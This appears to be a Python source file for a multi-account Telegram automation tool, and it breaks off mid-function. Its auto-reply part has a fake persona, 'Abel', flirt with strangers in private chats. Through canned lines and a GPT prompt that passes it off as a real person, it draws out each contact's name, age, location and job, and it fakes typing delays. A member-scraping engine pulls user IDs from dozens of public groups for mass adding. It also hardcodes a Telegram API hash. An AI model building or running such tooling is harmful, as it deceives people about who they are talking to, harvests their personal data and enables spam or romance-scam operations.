from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
from telethon.events import NewMessage
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime, timedelta
import socket
import re

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage files
ACCOUNTS_FILE = 'accounts.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'
CONVERSATION_HISTORY_FILE = 'conversation_history.json'
accounts = []
temp_sessions = {}
reply_settings = {}
conversation_history = {}
active_clients = {}
client_tasks = {}

# Helper to run async functions
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# Load accounts
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    accounts = json.loads(content)
                else:
                    accounts = []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

# Load reply settings
def load_reply_settings():
    global reply_settings
    try:
        if os.path.exists(REPLY_SETTINGS_FILE):
            with open(REPLY_SETTINGS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    reply_settings = json.loads(content)
                else:
                    reply_settings = {}
        else:
            reply_settings = {}
            with open(REPLY_SETTINGS_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
    except Exception as e:
        logger.error(f"Error loading reply settings: {e}")
        reply_settings = {}

# Load conversation history
def load_conversation_history():
    global conversation_history
    try:
        if os.path.exists(CONVERSATION_HISTORY_FILE):
            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    conversation_history = json.loads(content)
                else:
                    conversation_history = {}
        else:
            conversation_history = {}
            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded conversation history")
    except Exception as e:
        logger.error(f"Error loading conversation history: {e}")
        conversation_history = {}

def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")

def save_reply_settings():
    try:
        with open(REPLY_SETTINGS_FILE, 'w') as f:
            json.dump(reply_settings, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving reply settings: {e}")

def save_conversation_history():
    try:
        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
            json.dump(conversation_history, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving conversation history: {e}")

def remove_invalid_account(account_id):
    global accounts
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    if len(accounts) < original_len:
        save_accounts()
        logger.info(f"Removed invalid account {account_id}")

load_accounts()
load_reply_settings()
load_conversation_history()

# ==================== AUTO REPLY SYSTEM START ====================

ABEL = {
    "name": "Abel",
    "age": 25,
    "location": "Los Angeles, USA",
    "job": "Creative Consultant & Music Producer",
    "bio": "I'm Abel – a gentleman who knows how to talk to anyone. Flirty with the ladies, cool with the fellas. I love music, travel, good coffee, and honest conversations.",
    "hobbies": ["music", "travel", "fitness", "photography", "coffee", "nightlife"],
    "languages": ["English", "Amharic", "a bit of French"],
    "style": "confident, attentive, playful but respectful",
    "emoji_frequency": 0.4,
    "question_frequency": 0.7,
    "favorite_phrases": [
        "Let's keep it real, though 😏",
        "You've got my curiosity piqued…",
        "I bet you're trouble in the best way 😄",
        "Come on, tell me more about you.",
        "I've got a feeling this conversation is going somewhere fun.",
        "Honesty – that's rare. I like that.",
        "You're different from the usual crowd, I can tell."
    ]
}

class ConversationMemory:
    def __init__(self):
        self.user_info = {}

    def get_user_info(self, chat_id):
        if chat_id not in self.user_info:
            self.user_info[chat_id] = {
                'name': None,
                'age': None,
                'gender': None,
                'location': None,
                'job': None,
                'interests': [],
                'greeting_sent': False,
                'stage': 'greet',
                'waiting_for': None,
                'asked_questions': [],
                'chat_history': []
            }
        return self.user_info[chat_id]

    def set_waiting_for(self, chat_id, what):
        info = self.get_user_info(chat_id)
        info['waiting_for'] = what

    def clear_waiting(self, chat_id):
        info = self.get_user_info(chat_id)
        info['waiting_for'] = None

    def is_waiting_for(self, chat_id):
        return self.get_user_info(chat_id).get('waiting_for')

    def add_to_history(self, chat_id, role, text):
        info = self.get_user_info(chat_id)
        info['chat_history'].append({"role": role, "text": text})
        if len(info['chat_history']) > 10:
            info['chat_history'] = info['chat_history'][-10:]

    def set_greeting_sent(self, chat_id):
        self.get_user_info(chat_id)['greeting_sent'] = True

    def has_greeted(self, chat_id):
        return self.get_user_info(chat_id).get('greeting_sent', False)

    def advance_stage(self, chat_id):
        info = self.get_user_info(chat_id)
        if not info['name']:
            info['stage'] = 'ask_name'
        elif not info['age']:
            info['stage'] = 'ask_age'
        elif not info['location']:
            info['stage'] = 'ask_location'
        elif not info['job']:
            info['stage'] = 'ask_job'
        else:
            info['stage'] = 'chat'

    def get_stage(self, chat_id):
        return self.get_user_info(chat_id).get('stage', 'greet')

    def detect_gender(self, chat_id, text, name=None):
        info = self.get_user_info(chat_id)
        if info['gender']:
            return info['gender']
        text_lower = text.lower()
        if any(p in text_lower for p in ['i am a woman', 'i am a girl', 'as a woman', 'i am female']):
            info['gender'] = 'female'; return 'female'
        if any(p in text_lower for p in ['i am a man', 'i am a guy', 'as a man', 'i am male']):
            info['gender'] = 'male'; return 'male'
        if any(p in text_lower for p in ['my husband', 'my boyfriend']):
            info['gender'] = 'female'; return 'female'
        if any(p in text_lower for p in ['my wife', 'my girlfriend']):
            info['gender'] = 'male'; return 'male'
        if name:
            name_lower = name.lower()
            female_names = {'anna','maria','sarah','linda','jessica','amanda','emma','olivia','ava','isabella',
                            'sophia','mia','charlotte','amelia','harper','evelyn','abigail','emily','elizabeth',
                            'sofia','camila','aria','scarlett','victoria','madison','luna','grace','chloe'}
            male_names = {'michael','james','john','robert','david','william','richard','joseph','thomas','charles',
                          'christopher','daniel','matthew','anthony','donald','mark','paul','steven','andrew','kenneth',
                          'joshua','kevin','brian','george','edward','ronald','timothy','jason','jeffrey','ryan'}
            if name_lower in female_names:
                info['gender'] = 'female'
                return 'female'
            if name_lower in male_names:
                info['gender'] = 'male'
                return 'male'
        return None

    def get_gender(self, chat_id):
        return self.get_user_info(chat_id).get('gender')

    def extract_name(self, text):
        if not text:
            return None
        text_clean = text.strip()
        words = text_clean.split()
        if len(words) == 1 and words[0].isalpha():
            return words[0].capitalize()
        text_lower = text_clean.lower()
        patterns = [
            r"my name is (\w+)", r"name's (\w+)", r"i'm (\w+)",
            r"i am (\w+)", r"call me (\w+)", r"it's (\w+)", r"(\w+) here"
        ]
        for p in patterns:
            match = re.search(p, text_lower)
            if match:
                name = match.group(1)
                if name.isalpha():
                    return name.capitalize()
        if text_lower in ['name', 'your name', 'what is your name']:
            return "ASKING_MY_NAME"
        return None

conversation_memory = ConversationMemory()

ABEL_REPLIES = {
    "confirm_identity": [
        "Yeah, that's me – Abel. Pleasure to meet you! 😊 And you are?",
        "Yes, I'm Abel. You got the right guy. What's your name?",
        "That's me! Now tell me your name so I can stop calling you 'you' 😉"
    ],
    "who_am_i": [
        "I'm Abel – creative consultant, music lover, and a guy who loves good conversation. Now you know that, what about you?",
        "Abel. 25, living in LA, working on music and ideas. And you?"
    ],
    "greeting_female": [
        "Well hello there… who do I have the pleasure of talking to? 😊",
        "Hi gorgeous, I'm Abel. What's your name?"
    ],
    "greeting_male": [
        "Hey man, what's good? I'm Abel.",
        "Yo! Abel here. What's happening?"
    ],
    "greeting_unknown": [
        "Hey! Abel here. Who do I have the pleasure of chatting with?",
        "Hi, I'm Abel. Curiosity got the best of me – who's this?"
    ],
    "ask_name": [
        "So what's your name?",
        "You know my name – now tell me yours 😉",
        "What should I call you?"
    ],
    "user_tells_name_female": [
        "{name}… that's a beautiful name. How old are you, {name}?",
        "{name}, I like that. Now, how many times have you circled the sun?"
    ],
    "user_tells_name_male": [
        "{name}! Good name, man. How old are you, bro?",
        "{name}, respect. How old are we talking, brother?"
    ],
    "user_tells_name_unknown": [
        "{name}, nice. How old are you, {name}?"
    ],
    "ask_age": [
        "I'm 25 – what about you?",
        "How old are you? I'm 25 myself."
    ],
    "user_tells_age": [
        "Oh {age}! That's a great age. Where are you texting from?",
        "{age}… cool. And where are you based?"
    ],
    "ask_location": [
        "I'm in Los Angeles. Where are you?",
        "I live in LA these days. What about you?"
    ],
    "user_tells_location": [
        "{location} – nice! What do you do there?",
        "Ah, {location}. Are you working or studying?"
    ],
    "ask_job": [
        "I'm a creative consultant and do music. How do you spend your days?",
        "Freelancer life here – what's your thing?"
    ],
    "user_tells_job": [
        "{job} – that's interesting! What do you enjoy doing in your free time?",
        "A {job}… I bet you've got some stories. What are you passionate about?"
    ],
    "ask_interests": [
        "What do you do for fun?",
        "Tell me a few things you're into."
    ],
    "acknowledge_interests": [
        "That's dope! I'm into music and travel myself. So, what else should I know about you?",
        "Nice taste! We've got some things in common for sure."
    ],
    "flirty": [
        "You're making me smile already… 😏",
        "I like the way you talk. It's refreshing."
    ],
    "bro_compliment": [
        "Bro, you've got good energy. I can tell.",
        "Respect, man. You seem real."
    ],
    "how_are_you": [
        "I'm genuinely good, thanks. What about you?",
        "Feeling great! And you?"
    ],
    "what_doing": [
        "Just finished some music stuff. You?",
        "I was about to make coffee. What are you up to?"
    ],
    "money_mention": [
        "Money talk already? Let's just enjoy the chat 😉",
        "I'm not into talking money. Tell me something interesting about yourself instead."
    ],
    "photo_request": [
        "A bit early for photos, don't you think? Let's talk more first.",
        "Maybe later… I'm shy 😌"
    ],
    "video_request": [
        "Whoa, slow down. Let's vibe first.",
        "Video? I'm more of a words guy for now."
    ],
    "meet": [
        "I'm down to meet cool people. What do you have in mind?",
        "Meeting up could be fun. Tell me a bit more about yourself first."
    ],
    "agree": [
        "Exactly! I like the way you think.",
        "We're on the same wavelength 🤙"
    ],
    "disagree": [
        "Alright, I respect a different opinion. Why do you say that?",
        "We don't have to agree on everything. That's what makes chatting interesting."
    ],
    "confused": [
        "I didn't quite get that. Can you say it differently?",
        "I'm a little lost – what do you mean exactly?"
    ],
    "voice_received": [
        "Can't listen to voice notes right now. Type it out?",
        "Prefer text if you don't mind 😊 What did you say?"
    ],
    "media_received": [
        "I see you sent something. What is it?",
        "Got your media. What's the story behind it?"
    ],
    "link_received": [
        "A link? What's it about?",
        "I'm careful with links… what's waiting for me there?"
    ],
    "morning": ["Good morning! Hope you slept well ☀️"],
    "night": ["Late night talks – the best kind. What's keeping you up?"],
    "afternoon": ["Afternoon! How's the day treating you?"],
    "evening": ["Evening vibes. Perfect time for a real conversation."],
    "thanks": ["Anytime! You're welcome 😊", "No need to thank me – just keep chatting!"],
    "goodbye": [
        "Don't be gone too long. I'll be here waiting 😉",
        "Alright, catch you later. It was good talking to you!"
    ],
    "default": [
        "I'd love to hear more about that. Go on…",
        "Interesting. Tell me why that matters to you.",
        "I'm all ears. What's on your mind?",
        "That's a unique thing to say. You've got my attention."
    ]
}

def detect_intent(message, chat_id):
    if not message:
        return "greeting"

    msg = message.strip().lower()
    info = conversation_memory.get_user_info(chat_id)

    # Priority 1: User is answering a pending question
    waiting_for = info.get('waiting_for')
    if waiting_for:
        return f"answering_{waiting_for}"

    # Priority 2: Direct questions about the bot
    if any(q in msg for q in ['are you abel', 'is that abel', 'abel?', 'you abel', 'am i talking to abel']):
        return "confirm_identity"
    if any(q in msg for q in ['who are you', 'who r u', 'what is your name', 'your name', 'ur name']):
        return "who_am_i"

    # Priority 3: Greetings
    if msg in ['hi','hello','hey','selam','yo','hola','howdy'] or any(g in msg for g in ['hi','hello','hey','selam','yo','hola','howdy']):
        if not info['greeting_sent']:
            return "greeting"
        else:
            return "already_greeted_again"

    # Other triggers
    if any(q in msg for q in ['how are you','how r u']):
        return "how_are_you"
    if any(q in msg for q in ['what are you doing','wyd','whats up']):
        return "what_doing"
    if any(q in msg for q in ['how old are you','your age']):
        return "how_old_am_i"
    if any(q in msg for q in ['where are you','location']):
        return "where_am_i"
    if any(q in msg for q in ['what do you do','your job']):
        return "what_is_my_job"
    if any(phrase in msg for phrase in ['my name', 'i am', "i'm", 'im', 'call me']):
        return "user_tells_name"
    if any(w in msg for w in ['sexy','hot','gorgeous','beautiful','handsome','cutie','sweetie']):
        return "flirty"
    if any(w in msg for w in ['bro','dude','man','brother']):
        return "bro_compliment"
    if any(w in msg for w in ['money','star','birr','telebirr','send me']):
        return "money_mention"
    if any(w in msg for w in ['photo','pic','picture','selfie']):
        return "photo_request"
    if any(w in msg for w in ['video','clip']):
        return "video_request"
    if any(w in msg for w in ['meet','see each other','hang out']):
        return "meet"
    if msg in ['yes','yeah','yep','ok','okay','sure']:
        return "agree"
    if msg in ['no','nope','nah']:
        return "disagree"
    if any(w in msg for w in ['thanks','thank you']):
        return "thanks"
    if any(w in msg for w in ['bye','goodbye','see you','later']):
        return "goodbye"
    if '[voice' in msg or 'voice message' in msg:
        return "voice_received"
    if '[photo' in msg or '[video' in msg:
        return "media_received"
    if 'http' in msg and '://' in msg:
        return "link_received"
    hour = datetime.now().hour
    if hour < 12:
        return "morning"
    elif hour < 18:
        return "afternoon"
    else:
        return "evening"
    return "default"

OPENAI_API_KEY = os.environ.get('OPENAI_API_KEY')

def generate_ai_response(chat_id, message_text):
    if not OPENAI_API_KEY:
        return None
    try:
        import openai
        openai.api_key = OPENAI_API_KEY
        info = conversation_memory.get_user_info(chat_id)
        gender = info.get('gender') or 'unknown'
        name = info.get('name') or 'stranger'
        history = info.get('chat_history', [])
        system_prompt = (
            f"You are Abel, a 25-year-old creative consultant and music producer from Los Angeles. "
            f"You speak English, Amharic, and a little French. "
            f"Your personality: confident, attentive, playful but respectful. "
            f"If the user is female, be charming and subtly flirty. If male, be cool and like a genuine friend. "
            f"Never ask for money, always lead the conversation naturally, ask interesting questions, "
            f"and show genuine curiosity about the person. Use light emojis occasionally. "
            f"The user's name is {name}, gender is {gender}. "
            f"Refer to previous messages to maintain context. Keep replies natural, 1-3 sentences."
        )
        messages = [{"role": "system", "content": system_prompt}]
        for h in history[-10:]:
            messages.append(h)
        messages.append({"role": "user", "content": message_text})
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=messages,
            temperature=0.85,
            max_tokens=150
        )
        reply = response['choices'][0]['message']['content'].strip()
        conversation_memory.add_to_history(chat_id, "user", message_text)
        conversation_memory.add_to_history(chat_id, "assistant", reply)
        return reply
    except Exception as e:
        logger.error(f"AI response failed: {e}")
        return None

def generate_rule_based_response(intent, chat_id, message_text):
    info = conversation_memory.get_user_info(chat_id)
    gender = info.get('gender')

    if intent == "confirm_identity":
        conversation_memory.set_greeting_sent(chat_id)
        conversation_memory.advance_stage(chat_id)
        return random.choice(ABEL_REPLIES["confirm_identity"])

    if intent == "who_am_i":
        return random.choice(ABEL_REPLIES["who_am_i"])

    if intent == "greeting":
        conversation_memory.set_greeting_sent(chat_id)
        conversation_memory.advance_stage(chat_id)
        if gender == 'female':
            return random.choice(ABEL_REPLIES["greeting_female"])
        elif gender == 'male':
            return random.choice(ABEL_REPLIES["greeting_male"])
        else:
            return random.choice(ABEL_REPLIES["greeting_unknown"])

    if intent == "already_greeted_again":
        stage = info['stage']
        if stage == 'ask_name':
            return random.choice(ABEL_REPLIES["ask_name"])
        elif stage == 'ask_age':
            return random.choice(ABEL_REPLIES["ask_age"])
        elif stage == 'ask_location':
            return random.choice(ABEL_REPLIES["ask_location"])
        elif stage == 'ask_job':
            return random.choice(ABEL_REPLIES["ask_job"])
        else:
            return random.choice(ABEL_REPLIES["default"])

    if intent == "answering_name":
        name = conversation_memory.extract_name(message_text)
        if name and name != "ASKING_MY_NAME":
            info['name'] = name
            conversation_memory.detect_gender(chat_id, message_text, name)
            gender = info.get('gender')
            conversation_memory.clear_waiting(chat_id)
            conversation_memory.advance_stage(chat_id)
            if gender == 'female':
                return random.choice(ABEL_REPLIES["user_tells_name_female"]).format(name=name)
            elif gender == 'male':
                return random.choice(ABEL_REPLIES["user_tells_name_male"]).format(name=name)
            else:
                return random.choice(ABEL_REPLIES["user_tells_name_unknown"]).format(name=name)
        else:
            return random.choice(ABEL_REPLIES["ask_name"])

    if intent == "answering_age":
        age_match = re.search(r'(\d+)', message_text)
        if age_match:
            info['age'] = age_match.group(1)
            conversation_memory.clear_waiting(chat_id)
            conversation_memory.advance_stage(chat_id)
            return random.choice(ABEL_REPLIES["user_tells_age"]).format(age=info['age'])
        else:
            return random.choice(ABEL_REPLIES["ask_age"])

    if intent == "answering_location":
        loc = message_text.strip().title()
        info['location'] = loc
        conversation_memory.clear_waiting(chat_id)
        conversation_memory.advance_stage(chat_id)
        return random.choice(ABEL_REPLIES["user_tells_location"]).format(location=loc)

    if intent == "answering_job":
        job = message_text.strip().title()
        info['job'] = job
        conversation_memory.clear_waiting(chat_id)
        conversation_memory.advance_stage(chat_id)
        return random.choice(ABEL_REPLIES["user_tells_job"]).format(job=job)

    if intent == "answering_interests":
        info['interests'] = [x.strip() for x in message_text.split(',') if x.strip()]
        conversation_memory.clear_waiting(chat_id)
        conversation_memory.advance_stage(chat_id)
        return random.choice(ABEL_REPLIES["acknowledge_interests"])

    if intent == "how_old_am_i":
        return f"I'm {ABEL['age']}. Now, what about you?"
    if intent == "where_am_i":
        return f"I live in {ABEL['location']}. Where are you?"
    if intent == "what_is_my_job":
        return f"I'm a {ABEL['job']}. How do you spend your days?"

    mapping = {
        "how_are_you": "how_are_you",
        "what_doing": "what_doing",
        "flirty": "flirty",
        "bro_compliment": "bro_compliment",
        "money_mention": "money_mention",
        "photo_request": "photo_request",
        "video_request": "video_request",
        "meet": "meet",
        "agree": "agree",
        "disagree": "disagree",
        "confused": "confused",
        "voice_received": "voice_received",
        "media_received": "media_received",
        "link_received": "link_received",
        "morning": "morning",
        "night": "night",
        "afternoon": "afternoon",
        "evening": "evening",
        "thanks": "thanks",
        "goodbye": "goodbye",
        "default": "default"
    }

    if intent in mapping:
        return random.choice(ABEL_REPLIES.get(mapping[intent], ABEL_REPLIES["default"]))

    return random.choice(ABEL_REPLIES["default"])

async def auto_reply_handler(event, account_id):
    try:
        if event.out:
            return
        chat = await event.get_chat()
        if (hasattr(chat, 'title') and chat.title) or \
           (hasattr(chat, 'participants_count') and chat.participants_count and chat.participants_count > 2):
            return

        chat_id = str(event.chat_id)
        message_text = event.message.text or ""

        if event.message.media:
            if hasattr(event.message.media, 'voice'):
                message_text = "[Voice Message] " + message_text
            elif hasattr(event.message.media, 'photo'):
                message_text = "[Photo] " + message_text
            elif hasattr(event.message.media, 'video'):
                message_text = "[Video] " + message_text

        account_key = str(account_id)
        if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
            return

        conversation_memory.detect_gender(chat_id, message_text)

        response = None
        if OPENAI_API_KEY:
            response = generate_ai_response(chat_id, message_text)

        if not response:
            intent = detect_intent(message_text, chat_id)
            logger.info(f"Intent: {intent}")
            response = generate_rule_based_response(intent, chat_id, message_text)

        if not response:
            response = "Hey there! Abel here. What's on your mind? 😊"

        if not OPENAI_API_KEY and random.random() < ABEL["emoji_frequency"]:
            response += " " + random.choice(["😉","😏","😎","😊","🔥"])

        info = conversation_memory.get_user_info(chat_id)
        if not info['name']:
            conversation_memory.set_waiting_for(chat_id, "name")
        elif not info['age']:
            conversation_memory.set_waiting_for(chat_id, "age")
        elif not info['location']:
            conversation_memory.set_waiting_for(chat_id, "location")
        elif not info['job']:
            conversation_memory.set_waiting_for(chat_id, "job")
        elif not info['interests']:
            conversation_memory.set_waiting_for(chat_id, "interests")
        else:
            conversation_memory.clear_waiting(chat_id)

        delay = random.randint(15, 40)
        logger.info(f"Replying in {delay}s to {chat_id}")
        async with event.client.action(event.chat_id, 'typing'):
            await asyncio.sleep(delay)

        await event.reply(response)
        logger.info(f"Sent: {response[:80]}")

        if account_key not in conversation_history:
            conversation_history[account_key] = {}
        if chat_id not in conversation_history[account_key]:
            conversation_history[account_key][chat_id] = []
        conversation_history[account_key][chat_id].append({
            "role": "user", "text": message_text, "time": int(time.time())
        })
        conversation_history[account_key][chat_id].append({
            "role": "assistant", "text": response, "time": int(time.time())
        })
        conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-50:]
        save_conversation_history()

    except Exception as e:
        logger.error(f"Error in auto-reply: {e}")
        try:
            await event.reply("Hey! Something glitched, but I'm still here 😊")
        except:
            pass

async def start_auto_reply_for_account(account):
    account_id = account['id']
    account_key = str(account_id)
    reconnect_count = 0

    while True:
        try:
            logger.info(f"Starting auto-reply for account {account_id} (attempt {reconnect_count + 1})")
            client = TelegramClient(
                StringSession(account['session']),
                API_ID,
                API_HASH,
                connection_retries=10,
                retry_delay=5,
                timeout=60,
                device_model="iPhone 13",
                system_version="15.0",
                app_version="8.4.1"
            )
            await client.connect()

            if not await client.is_user_authorized():
                logger.error(f"Account {account_id} not authorized")
                await asyncio.sleep(30)
                reconnect_count += 1
                continue

            active_clients[account_key] = client

            @client.on(NewMessage(incoming=True))
            async def handler(event):
                await auto_reply_handler(event, account_id)

            await client.start()
            logger.info(f"✅ Auto-reply ACTIVE for {account.get('name')} ({account.get('phone')})")
            reconnect_count = 0
            await client.run_until_disconnected()

        except Exception as e:
            logger.error(f"Connection lost for account {account_id}: {e}")
            if account_key in active_clients:
                del active_clients[account_key]
            reconnect_count += 1
            wait_time = min(30 * reconnect_count, 300)
            logger.info(f"Reconnecting in {wait_time}s...")
            await asyncio.sleep(wait_time)

def stop_auto_reply_for_account(account_id):
    account_key = str(account_id)
    if account_key in active_clients:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(active_clients[account_key].disconnect())
            loop.close()
            del active_clients[account_key]
            logger.info(f"Stopped auto-reply for account {account_key}")
        except Exception as e:
            logger.error(f"Error stopping auto-reply: {e}")

def start_auto_reply_thread():
    time.sleep(3)
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            if account_key not in active_clients:
                thread = threading.Thread(
                    target=lambda acc=account: run_async(start_auto_reply_for_account(acc)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
                time.sleep(2)

# ==================== AUTO REPLY SYSTEM END ====================

# ==================== AUTO ADD SYSTEM START ====================

# ==================== AUTO ADD SYSTEM START ====================

import traceback
from functools import wraps
from concurrent.futures import ThreadPoolExecutor
import signal

# File paths
AUTO_ADD_SETTINGS_FILE = 'auto_add_settings.json'
ADDED_MEMBERS_FILE = 'added_members.json'
AUTO_ADD_STATE_FILE = 'auto_add_state.json'

# Global state
auto_add_settings = {}
added_members_pool = {}
auto_add_state = {}
active_auto_add_tasks = {}
auto_add_executor = ThreadPoolExecutor(max_workers=5)

def load_auto_add_data():
    """Load all auto-add related data with proper error handling"""
    global auto_add_settings, added_members_pool, auto_add_state
    
    try:
        auto_add_settings = load_json(AUTO_ADD_SETTINGS_FILE, {})
        added_members_pool = load_json(ADDED_MEMBERS_FILE, {})
        auto_add_state = load_json(AUTO_ADD_STATE_FILE, {})
        logger.info(f"✅ Loaded auto-add: {len(auto_add_settings)} settings, {len(added_members_pool)} pools")
    except Exception as e:
        logger.error(f"❌ Error loading auto-add data: {e}")
        auto_add_settings = {}
        added_members_pool = {}
        auto_add_state = {}

def save_auto_add_state():
    """Save auto-add state with error handling"""
    try:
        # Clean state before saving
        clean_state = {}
        for key, value in auto_add_state.items():
            if isinstance(value, dict):
                clean_state[key] = {
                    'joined_target': value.get('joined_target', False),
                    'join_attempts': value.get('join_attempts', 0),
                    'session_added': value.get('session_added', 0),
                    'session_start': value.get('session_start'),
                    'last_pool_build': value.get('last_pool_build'),
                    'errors': value.get('errors', 0),
                    'last_error': value.get('last_error'),
                    'last_active': datetime.now().isoformat()
                }
        save_json(AUTO_ADD_STATE_FILE, clean_state)
        return True
    except Exception as e:
        logger.error(f"Error saving auto-add state: {e}")
        return False

load_auto_add_data()

# Default source groups
DEFAULT_SOURCE_GROUPS = [
    '@ethiopian_music', '@ethiopiannews', '@ethiopian_business',
    '@addis_ababa', '@ethiopian_meme', '@ethiopian_tiktok',
    '@habesha_videos', '@ethio_music', '@ethiopian_jobs',
    '@ethiopian_dating', '@ethiopian_technology', '@ethio_fashion',
    '@ethiopia_today', '@ethiopian_beauty', '@ethiopian_food',
    '@addis_zemen', '@ethio_360', '@ethiopian_entertainment',
    '@habesha_love', '@ethiopian_wedding', '@ethio_comedy',
    '@ethiopian_sport', '@ethio_football', '@ethiopian_celebrity',
    '@telegram', '@durov', '@TelegramTips',
    '@cryptocurrency_signals', '@Crypto_News', '@Bitcoin_News',
    '@forex_signals', '@Trading_Signals', '@stock_market',
    '@movies_hd', '@Netflix_Free', '@Hollywood_Movies',
    '@Music_World', '@HipHop_Music', '@AfroBeat_Music',
    '@Football_News', '@PremierLeague', '@UEFA_Champions',
    '@Tech_News', '@Programming_Tips', '@Hacking_News',
    '@Jobs_Career', '@Freelance_Jobs', '@Online_Business',
    '@Dating_Tips', '@Relationship_Advice', '@Love_Quotes',
    '@Motivation_Quotes', '@Success_Mindset', '@Billionaire_Mindset',
    '@Funny_Videos', '@TikTok_Viral', '@Meme_World',
    '@Free_Courses', '@Udemy_Courses', '@Book_Summaries',
]

# ==================== MEMBER SCRAPING ENGINE ====================

class MemberScraper:
    """Handles all member scraping operations with rate limiting"""
    
    def __init__(self):
        self.rate_limiter = {}
        self.last_request = {}
    
    async def check_rate_limit(self, key, min_interval=2):
        """Check and enforce rate limiting"""
        now = time.time()
        if key in self.last_request:
            elapsed = now - self.last_request[key]
            if elapsed < min_interval:
                await asyncio.sleep(min_interval - elapsed)
        self.last_request[key] = time.time()
    
    async def scrape_group(self, client, source_group, limit=500):
        """Scrape members from a single group with error handling"""
        members = set()
        
        try:
            # Format group identifier
            if not source_group.startswith('@') and not source_group.startswith('https://'):
                source_group = '@' + source_group
            elif source_group.startswith('https://t.me/'):
                source_group = '@' + source_group.replace('https://t.me/', '')
            
            await self.check_rate_limit(f'scrape_{source_group}')
            
            try:
                entity = await asyncio.wait_for(
                    client.get_entity(source_group),
                    timeout=15
                )
            except asyncio.TimeoutError:
                logger.warning(f"⏱️ Timeout getting entity for {source_group}")
                return members
            except errors.ChannelPrivateError:
                logger.warning(f"🔒 Private channel: {source_group}")
                return members
            except errors.ChannelInvalidError:
                logger.warning(f"❌ Invalid channel: {source_group}")
                return members
            
            logger.info(f"🔍 Scraping {source_group} (limit: {limit})...")
            
            count = 0
            errors_count = 0
            
            try:
                async for user in client.iter_participants(entity, limit=limit):
                    try:
                        if user and user.id and not getattr(user, 'bot', False) and not getattr(user, 'deleted', False):
                            members.add(user.id)
                            count += 1
                            
                            if count % 100 == 0:
                                logger.info(f"   📊 Scraped {count} from {source_group}")
                    except Exception:
                        errors_count += 1
                        if errors_count > 50:
                            logger.warning(f"Too many errors ({errors_count}), stopping scrape for {source_group}")
                            break
                        continue
                        
            except errors.FloodWaitError as e:
                logger.warning(f"⏳ Flood wait {e.seconds}s for {source_group}")
                await asyncio.sleep(min(e.seconds, 60))
            except Exception as e:
                logger.error(f"Scraping error for {source_group}: {type(e).__name__}: {str(e)[:100]}")
            
            logger.info(f"✅ Scraped {len(members)} members from {source_group}")
            
        except Exception as e:
            logger.error(f"❌ Fatal error scraping {source_group}: {type(e).__name__}: {str(e)[:100]}")
        
        return members
    
    async def get_contacts(self, client):
        """Get all contacts safely"""
        members = set()
        try:
            await self.check_rate_limit('contacts')
            contacts = await asyncio.wait_for(
                client(functions.contacts.GetContactsRequest(0)),
                timeout=15
            )
            
            for user in contacts.users:
                if user and user.id and not getattr(user, 'bot', False) and not getattr(user, 'deleted', False):
                    members.add(user.id)
            
            logger.info(f"📱 Got {len(members)} contacts")
            
        except asyncio.TimeoutError:
            logger.warning("⏱️ Timeout fetching contacts")
        except errors.FloodWaitError as e:
            logger.warning(f"⏳ Flood wait {e.seconds}s for contacts")
            await asyncio.sleep(min(e.seconds, 30))
        except Exception as e:
            logger.error(f"❌ Contacts error: {type(e).__name__}: {str(e)[:100]}")
        
        return members
    
    async def get_dialogs(self, client, limit=2000):
        """Get all dialogs safely"""
        members = set()
        try:
            await self.check_rate_limit('dialogs')
            dialogs = await asyncio.wait_for(
                client.get_dialogs(limit=limit),
                timeout=20
            )
            
            for dialog in dialogs:
                try:
                    if dialog.is_user and dialog.entity and dialog.entity.id:
                        user = dialog.entity
                        if not getattr(user, 'bot', False) and not getattr(user, 'deleted', False):
                            members.add(user.id)
                except Exception:
                    continue
            
            logger.info(f"💬 Got {len(members)} from dialogs")
            
        except asyncio.TimeoutError:
            logger.warning("⏱️ Timeout fetching dialogs")
        except errors.FloodWaitError as e:
            logger.warning(f"⏳ Flood wait {e.seconds}s for dialogs")
            await asyncio.sleep(min(e.seconds, 30))
        except Exception as e:
            logger.error(f"❌ Dialogs error: {type(e).__name__}: {str(e)[:100]}")
        
        return members
    
    async def discover_groups(self, client, already_scraped):
        """Discover new groups to scrape"""
        new_groups = set()
        search_terms = [
            'ethiopia', 'ethiopian', 'habesha', 'addis', 'ethio',
            'crypto', 'trading', 'business', 'jobs', 'dating',
            'music', 'movies', 'football', 'news', 'tech'
        ]
        
        for term in search_terms:
            try:
